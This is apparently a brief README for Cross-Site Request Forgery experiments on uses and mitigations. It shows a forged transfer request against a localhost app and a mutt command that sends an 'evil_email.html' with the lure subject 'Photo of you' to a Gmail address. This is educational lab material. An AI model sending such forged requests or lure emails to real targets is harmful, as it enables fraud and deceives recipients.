Cross-Site Request Forgery
================

Experiments showing uses and mitigation techniques for Cross-Site Request Forgeries





http://localhost:8888/?action=transfer&to=33333333&from=22222222&amount=1

mutt -e 'set content_type=text/html' -s 'Photo of you' 'tog000@gmail.com' < evil_email.html